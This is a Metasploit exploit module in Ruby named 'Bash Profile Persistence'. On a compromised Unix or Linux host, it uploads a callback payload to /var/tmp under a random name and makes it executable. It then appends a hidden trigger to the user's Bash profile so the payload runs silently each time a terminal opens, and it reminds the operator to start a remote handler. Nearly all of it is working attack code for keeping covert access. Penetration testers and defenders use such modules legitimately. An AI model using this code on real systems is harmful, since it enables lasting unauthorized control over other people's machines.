# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;           => &#039;Bash Profile Persistence&#039;,
        &#039;Description&#039;    => %q{"
          This module writes an execution trigger to the target&#039;s Bash profile.
          The execution trigger executes a call back payload whenever the target
          user opens a Bash terminal. A handler is not run automatically, so you
          must configure an appropriate exploit/multi/handler to receive the callback.
        "},
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         =>
          [
            &#039;Michael Long <bluesentinel[at]protonmail.com>&#039;
          ],
        &#039;DisclosureDate&#039; => &#039;Jun 8 1989&#039;, # First public release of Bourne Again Shell
        &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;],
        &#039;Arch&#039;           => ARCH_CMD,
        &#039;DefaultOptions&#039; => { &#039;WfsDelay&#039; => 0, &#039;DisablePayloadHandler&#039; => &#039;true&#039; },
        &#039;Targets&#039;        =>
          [
            [&#039;Automatic&#039;, {}]
          ],
        &#039;DefaultTarget&#039;  => 0,
        &#039;Payload&#039;        => {
          &#039;Compat&#039;       =>
          {
            &#039;PayloadType&#039; => &#039;cmd&#039;
          }
        },
        &#039;References&#039; =>
        [
          [&#039;URL&#039;, &#039;https://attack.mitre.org/techniques/T1156/&#039;]
        ]
      ))

    register_options(
      [
        OptString.new(&#039;BASH_PROFILE&#039;, [true, &#039;Target Bash profile location. Usually ~/.bashrc or ~/.bash_profile.&#039;, &#039;~/.bashrc&#039;]),
        OptString.new(&#039;PAYLOAD_DIR&#039;, [true, &#039;Directory to write persistent payload file.&#039;, &#039;/var/tmp/&#039;])
      ]
    )
  end

  def exploit

    # expand home directory path (i.e. &#039;~/.bashrc&#039; becomes &#039;/home/user/.bashrc&#039;)
    profile_path = datastore[&#039;BASH_PROFILE&#039;]
    if profile_path.start_with?(&#039;~/&#039;)
      home_directory = get_env(&#039;$HOME&#039;)
      profile_path.sub!(/^~/, home_directory)
    end

    # check that target Bash profile file exists
    unless exist?(profile_path)
      fail_with Failure::NotFound, profile_path
    end
    print_good("Bash profile exists: #{profile_path}")

    # check that target Bash profile file is writable
    unless writable?(profile_path)
      fail_with Failure::NoAccess, profile_path
    end
    print_good("Bash profile is writable: #{profile_path}")

    # create Bash profile backup on local system before persistence is added
    backup_profile = read_file(profile_path)
    backup_profile_path = create_backup_file(backup_profile)
    print_status("Created backup Bash profile: #{backup_profile_path}")

    # upload persistent payload to target and make executable (chmod 700)
    payload_file = datastore[&#039;PAYLOAD_DIR&#039;] + Rex::Text.rand_text_alpha(10..16)
    upload_and_chmodx(payload_file, payload.encoded)

    # write payload trigger to Bash profile
    exec_payload_string = "#{payload_file} > /dev/null 2>&1 &" + "\n" # send stdin,out,err to /dev/null
    append_file(profile_path, exec_payload_string)
    print_good("Created Bash profile persistence")
    print_status("Payload will be triggered when target opens a Bash terminal")
    print_warning("Don&#039;t forget to start your handler:")
    print_warning("msf> handler -H #{datastore[&#039;LHOST&#039;]} -P #{datastore[&#039;LPORT&#039;]} -p #{datastore[&#039;PAYLOAD&#039;]}")
  end

  # create a backup copy of the target&#039;s Bash profile on the local system before persistence is added
  def create_backup_file(backup_profile)
    begin
      hostname = session.sys.config.sysinfo["Computer"]
    rescue
      hostname = cmd_exec("hostname")
    end

    timestamp = "_" + ::Time.now.strftime("%Y%m%d.%H%M%S")

    log_directory_name = ::File.join(Msf::Config.log_directory, &#039;persistence/&#039; + hostname + timestamp)

    ::FileUtils.mkdir_p(log_directory_name)

    log_file_name = log_directory_name + "/Bash_Profile.backup"
    file_local_write(log_file_name, backup_profile)
    return log_file_name
  end
end

